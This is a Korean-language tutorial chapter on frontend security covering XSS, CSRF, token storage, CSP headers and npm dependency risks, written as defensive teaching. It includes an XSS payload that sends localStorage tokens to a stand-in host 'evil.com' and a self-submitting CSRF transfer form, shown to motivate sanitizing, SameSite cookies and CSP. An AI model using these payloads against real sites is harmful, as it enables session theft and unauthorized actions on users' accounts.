# 27. 프론트엔드 보안 — XSS, CSRF, CSP, 의존성

> **이 장의 질문**: 코드가 사용자 기기에서 도는데, 무엇을 지킬 수 있고 무엇은 애초에 못 지키는가?

## BE로 치면 이런 것

2장의 명제를 다시 꺼냅니다.

> **프론트엔드의 검증은 UX이고, 보안은 서버의 몫이다.**

이 장은 그 문장을 부정하지 않습니다. **여전히 참입니다.** 다만 그것과 별개로 **프론트엔드에서만 생기는 공격면** 이 있습니다.

백엔드에서 SQL 인젝션을 막듯, 프론트엔드에는 **HTML/JS 인젝션** 이 있습니다. 원리가 같습니다 — **데이터를 코드로 해석하게 만드는 것.**

| | 백엔드 | 프론트엔드 |
| --- | --- | --- |
| 데이터가 코드가 됨 | SQL 인젝션 | **XSS** |
| 남의 권한으로 요청 | — | **CSRF** |
| 신뢰할 수 없는 의존성 | 공급망 공격 | 공급망 공격 (더 심함) |

## 먼저 정리: 프론트엔드에서 못 하는 것

시작하기 전에 경계를 확실히 해둡니다. 아래는 **아무리 해도 안 됩니다.**

- **API 키나 시크릿 숨기기** — 코드에 넣으면 읽힙니다(10장의 `NEXT_PUBLIC_`)
- **권한 검사** — 메뉴를 숨겨도 API는 직접 호출됩니다
- **입력값 검증으로 막기** — 개발자 도구로 우회됩니다
- **코드 난독화로 로직 감추기** — 시간을 벌 뿐입니다

**프론트엔드 보안은 "우리 사용자를 다른 사람으로부터 지키는 일"입니다.** "우리 서버를 사용자로부터 지키는 일"이 아닙니다. 그건 백엔드가 합니다.

## XSS — 남의 스크립트가 우리 페이지에서 도는 것

가장 중요한 항목입니다.

### 무엇이 문제인가

공격자가 우리 페이지에 JavaScript를 심는 데 성공하면, **그 코드는 우리 페이지의 권한을 전부 갖습니다.**

- 로그인 토큰을 읽어서 자기 서버로 보냄
- 사용자 대신 API를 호출 (송금, 권한 변경)
- 가짜 로그인 폼을 띄워 비밀번호 수집
- 화면 내용을 몰래 바꿈

**같은 오리진 안에서 도는 코드라 브라우저가 막아주지 않습니다.** 3장의 오리진 개념이 여기서 뒤집혀 작동합니다.

### 어떻게 심어지나

```js
// ❌ 사용자가 입력한 값을 HTML로 해석하게 만든다
element.innerHTML = `<div>${userName}</div>`;
```

`userName`이 `<img src=x onerror="fetch('//evil.com?t='+localStorage.token)">` 라면, 그 코드가 실행됩니다.

> 이것이 이 문서의 명령형 예제에서 `textContent`를 고집하는 이유입니다(16장, 심화 2장).

### React가 막아주는 것

**React는 기본적으로 안전합니다.**

```tsx
<div>{userName}</div>
```

`userName`에 무엇이 들어 있든 **문자열로 그립니다.** `<script>`라고 써 있으면 화면에 `<script>`라는 글자가 나옵니다. 이걸 자동 이스케이프라고 합니다.

**그래서 React 앱에서 XSS는 대부분 "일부러 이스케이프를 끈 곳"에서 납니다.**

### React가 막아주지 않는 것

**1. `dangerouslySetInnerHTML`**

```tsx
// ❌ 이름이 무섭게 지어진 데는 이유가 있습니다
<div dangerouslySetInnerHTML={{ __html: post.content }} />
```

이걸 써야 하는 상황이 실제로 있습니다 — 관리자가 작성한 리치 텍스트, 마크다운 렌더링 결과 등. 그럴 때는 **넣기 전에 정화(sanitize)** 합니다.

```tsx
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }} />
```

> **"우리 관리자만 쓰니까 괜찮다"는 위험한 가정입니다.** 관리자 계정이 털리면 그게 곧 전체 사용자 공격이 됩니다.

**2. `href`에 들어가는 값**

```tsx
// ❌ url이 "javascript:..." 이면 클릭 시 실행된다
<a href={user.website}>홈페이지</a>
```

사용자가 넣은 URL을 그대로 링크에 쓰면 안 됩니다. **프로토콜을 확인하세요.**

```tsx
const safe = /^https?:\/\//.test(url) ? url : '#';
```

**3. 외부에서 온 콘텐츠를 통째로 삽입하는 라이브러리**

마크다운 렌더러, 리치 텍스트 에디터, 차트 라이브러리의 툴팁 등. **HTML을 받는 옵션이 있는지** 확인하고, 있다면 정화를 거치게 하세요.

### 서버도 같이 해야 합니다

프론트엔드에서 정화하는 것은 **표시 시점의 방어** 입니다. 저장 시점에 서버에서도 검증·정화하는 것이 정석입니다. 두 겹으로 두세요.

## 토큰을 어디에 둘 것인가

실무에서 가장 자주 논쟁이 되는 주제입니다. **정답이 상황에 따라 다르므로** 트레이드오프를 이해하는 게 중요합니다.

| 저장 위치 | XSS에 | CSRF에 | 비고 |
| --- | --- | --- | --- |
| `localStorage` | ❌ **JS가 읽을 수 있음** | 안전 | 가장 흔하지만 XSS 한 방에 털림 |
| 일반 쿠키 | ❌ JS가 읽을 수 있음 | ❌ 자동 전송됨 | 최악의 조합 |
| **`HttpOnly` 쿠키** | ✅ **JS가 못 읽음** | ⚠️ 자동 전송됨 | **+ `SameSite`로 CSRF 대응** |

**권장은 `HttpOnly` + `Secure` + `SameSite` 쿠키입니다.**

```
Set-Cookie: token=...; HttpOnly; Secure; SameSite=Lax; Path=/
```

- `HttpOnly` — JavaScript가 읽을 수 없음. **XSS가 나도 토큰은 못 훔침**
- `Secure` — HTTPS에서만 전송
- `SameSite=Lax` — 다른 사이트에서 시작된 요청에는 안 붙음 (CSRF 대응)

> `localStorage`가 널리 쓰이는 이유는 **다루기 쉽고 크로스 도메인 API에 붙이기 편해서** 입니다. 다만 그 선택은 "XSS가 나면 토큰이 털린다"를 받아들이는 것입니다. 팀에서 이걸 알고 고르는 것과 모르고 고르는 것은 다릅니다.

## CSRF — 사용자 몰래 우리 API를 부르는 것

### 원리

사용자가 우리 사이트에 로그인한 상태로 공격자 사이트를 방문합니다. 그 페이지에 이런 것이 있습니다.

```html
<form action="https://ourapp.com/api/transfer" method="POST">
  <input name="to" value="attacker" />
</form>
<script>document.forms[0].submit();</script>
```

**브라우저는 쿠키를 자동으로 붙여 보냅니다.** 사용자는 아무것도 안 했는데 요청이 나갑니다.

### 대응

| 방법 | 설명 |
| --- | --- |
| **`SameSite=Lax`** | 다른 사이트에서 시작된 요청에 쿠키를 안 붙임. **요즘 브라우저 기본값** |
| CSRF 토큰 | 서버가 준 토큰을 요청에 실어 보냄. 공격자는 그 값을 모름 |
| `Authorization` 헤더 | 쿠키가 아니라 헤더로 보내면 자동 전송되지 않음 |

**쿠키 인증을 쓴다면 `SameSite`는 필수입니다.** 헤더 인증을 쓴다면 CSRF는 구조적으로 발생하지 않습니다 — 대신 토큰을 JS가 들고 있어야 해서 XSS 위험이 올라갑니다. **둘 사이의 교환입니다.**

## CSP — 마지막 방어선

Content-Security-Policy는 **"이 페이지에서 어디서 온 리소스를 허용할지"** 를 브라우저에게 알려주는 응답 헤더입니다.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.ourapp.com;
```

**XSS가 뚫렸을 때 피해를 줄이는 장치입니다.** 공격자가 스크립트를 심는 데 성공해도, 그것이 `evil.com`으로 데이터를 보내려 하면 브라우저가 막습니다.

방화벽의 아웃바운드 규칙과 같은 발상입니다. 안에 들어온 것을 못 막았어도, 나가는 것은 막습니다.

> **도입 순서**: 처음부터 강하게 걸면 멀쩡한 기능이 깨집니다. `Content-Security-Policy-Report-Only` 로 먼저 **위반 보고만 받아보고**, 정리한 뒤 실제로 적용하세요.

## 의존성 — 프론트엔드에서 더 위험한 이유

21장에서 `npm audit`을 봤습니다. 여기서 왜 프론트엔드가 더 위험한지 짚습니다.

**백엔드 라이브러리가 오염되면 서버에서 돕니다.** 나쁘지만, 서버는 방화벽 안에 있고 모니터링이 있습니다.

**프론트엔드 라이브러리가 오염되면 모든 사용자의 브라우저에서 돕니다.** 로그인 세션과 함께요. 실제로 npm 패키지가 탈취되어 악성 코드가 배포된 사고가 반복해서 있었습니다.

**실무 대응**

- 락 파일을 커밋합니다(10장). 설치되는 버전이 고정됩니다
- CI에서 `npm ci`를 씁니다(21장, 23장)
- 의존성 개수를 줄입니다. **줄 하나 아끼려고 패키지를 추가하지 마세요**
- 자동 업데이트 봇(Dependabot, Renovate)을 켭니다
- **`postinstall` 스크립트를 조심하세요.** 설치만으로 임의 코드가 실행됩니다

## 그 밖에 챙길 것

**클릭재킹** — 우리 페이지를 투명한 iframe으로 덮어 사용자가 엉뚱한 것을 누르게 만드는 공격입니다. CSP의 `frame-ancestors 'none'` 으로 막습니다.

**민감 정보를 URL에 넣지 않기** — 쿼리스트링은 브라우저 히스토리, 서버 로그, 리퍼러 헤더에 남습니다.

**`target="_blank"` 링크** — 요즘 브라우저는 기본으로 안전하지만, 명시적으로 `rel="noopener noreferrer"`를 붙이는 것이 관례입니다.

**에러 메시지** — 사용자에게 스택 트레이스를 보여주지 마세요. 내부 구조가 노출됩니다.

```
[ ] CSP 가 있는가? 최소한 Report-Only 라도?
[ ] 락 파일이 커밋되어 있고 CI가 npm ci 를 쓰는가?
[ ] 의존성 취약점 알림이 자동으로 오는가?
[ ] 프론트엔드 코드에 시크릿이 들어가 있지 않은가?
```

## 흔한 오해

**"React를 쓰니 XSS는 안전하다"**
기본 렌더링은 안전합니다. `dangerouslySetInnerHTML`과 `href`는 여전히 당신 몫입니다.

**"사내 어드민이라 보안은 덜 중요하다"**
어드민이야말로 권한이 큽니다. 그리고 XSS는 외부 노출과 무관하게 **데이터를 통해** 들어옵니다.

**"HTTPS를 쓰니까 안전하다"**
HTTPS는 전송 구간만 지킵니다. XSS·CSRF와는 다른 층위입니다.

**"프론트엔드에서 검증하니까 서버 검증은 생략해도 된다"**
2장의 그 문장입니다. 절대 아닙니다.

## 핵심 3가지

- **프론트엔드 보안은 우리 사용자를 지키는 일입니다.** 서버를 사용자로부터 지키는 일이 아닙니다. 그건 여전히 백엔드의 몫입니다.
- **XSS가 최우선입니다.** React는 기본 렌더링을 이스케이프해 주지만, `dangerouslySetInnerHTML`과 `href`는 직접 챙겨야 합니다. 뚫렸을 때를 대비해 CSP를 겹칩니다.
- **토큰 저장 위치는 트레이드오프입니다.** `HttpOnly` 쿠키는 XSS에 강하고 `SameSite`가 필요하며, `localStorage`는 다루기 쉽지만 XSS 한 번에 털립니다. 알고 고르세요.
